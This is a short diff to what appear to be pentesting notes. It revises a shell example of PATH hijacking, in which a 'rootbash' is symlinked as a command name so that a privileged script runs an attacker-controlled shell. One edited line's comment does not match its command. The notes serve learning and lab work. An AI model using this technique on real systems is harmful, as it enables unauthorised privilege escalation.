@@ -40,9 +40,9 @@ $ bash -c 'export PATH=; <execute the script>'
 
 You can then try to replace the command binary by a [rootbash](rootbash.md). 
 
-```
-$ ls /tmp/rootbash # assuming you created your rootbash
-$ ln -s /tmp/rootbash # replace the command "xxx"
+```shell!
+$ file /tmp/rootbash # create a rootbash
+$ ln -s /tmp/rootbash /tmp/xxx # replace the command "xxx"
 $ bash -c 'export PATH=/tmp:$PATH; <execute the script>'
 <your bash is called>
 ```
